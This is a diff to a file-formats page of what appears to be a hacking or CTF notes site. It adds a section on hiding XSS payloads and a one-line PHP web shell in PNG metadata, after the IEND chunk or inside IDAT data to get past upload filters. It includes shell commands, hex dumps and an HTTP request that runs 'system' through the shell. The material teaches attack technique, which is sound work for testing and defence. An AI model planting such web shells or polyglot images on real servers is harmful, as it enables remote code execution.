@@ -2,7 +2,7 @@
 description: What to do with a file you don't understand
 ---
 
-# File formats
+# File Formats
 
 ## Understanding common file formats
 
@@ -79,3 +79,52 @@ Options:
 PNG files consist of **chunks** of bytes that tell something about the image. The most common one is `IDAT` which contains the pixel data of the image. An image always ends with `IEND` and 4 checksum bytes (every chunk has the checksum).&#x20;
 
 You might see custom chunks being used to embed data, or data appended to the end, after `IEND`.&#x20;
+
+### Embed Raw Data
+
+You might find some applications where you are allowed to upload files and find that you can either give them a `.php` extension to create a web shell or make the `Content-Type: text/html` to render tags inside the raw bytes for [cross-site-scripting-xss.md](../web/cross-site-scripting-xss.md "mention"). In either case, this application might validate or even transform your image in a way that does not preserve all the original bytes, breaking your payload.&#x20;
+
+While you might be able to include **metadata** with tools like `exiftool`, these might be stripped by the server upon saving your file:
+
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ exiftool -Comment='&#x3C;svg/onload=alert()>' example.png
+</strong>    1 image files updated
+<strong>$ hd example.png
+</strong>00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|
+...
+00000080  e0 b6 b6 f4 d1 0d 53 22  0d 14 00 00 00 1c 74 45  |......S"......tE|
+<strong>00000090  58 74 43 6f 6d 6d 65 6e  74 00 3c 73 76 67 2f 6f  |XtComment.&#x3C;svg/o|
+</strong><strong>000000a0  6e 6c 6f 61 64 3d 61 6c  65 72 74 28 29 3e ad 30  |nload=alert()>.0|
+</strong>000000b0  14 57 00 00 08 7d 49 44  41 54 78 5e ec ce 31 0d  |.W...}IDATx^..1.|
+</code></pre>
+
+Another trick is simply appending data to the end of the file. This would not pass as a valid PNG anymore, but could survive on the server:
+
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ echo '&#x3C;svg/onload=alert()>' >> example.png
+</strong>
+<strong>$ hd example.png
+</strong>...
+000009d0  5a b3 07 54 ac 7b 51 fb  78 a7 ea 00 00 00 00 49  |Z..T.{Q.x......I|
+<strong>000009e0  45 4e 44 ae 42 60 82 3c  73 76 67 2f 6f 6e 6c 6f  |END.B`.&#x3C;svg/onlo|
+</strong><strong>000009f0  61 64 3d 61 6c 65 72 74  28 29 3e 0a              |ad=alert()>.|
+</strong>000009fc
+</code></pre>
+
+Lastly, there is a technique more resistant to transformation by using the **IDAT chunks**. These normally include compressed DEFLATE data representing the pixels themselves, but this process can be reversed to obtain a string of pixels that compress into a payload like:
+
+```php
+<?=$_GET[0]($_POST[1]);?>
+```
+
+If the payload above is executed, you can provide a function you want to call like `system()` as the query parameter `0`, and an argument you want to give the function in a `1` body parameter.&#x20;
+
+<pre class="language-http"><code class="lang-http"><strong>POST /shell.php?0=system HTTP/1.1
+</strong>...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+
+<strong>1=id
+</strong></code></pre>
+
+The process of creating these and a few example payloads are described in the following post, which also shows an XSS payload with the same idea:
+
+{% embed url="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/" %}
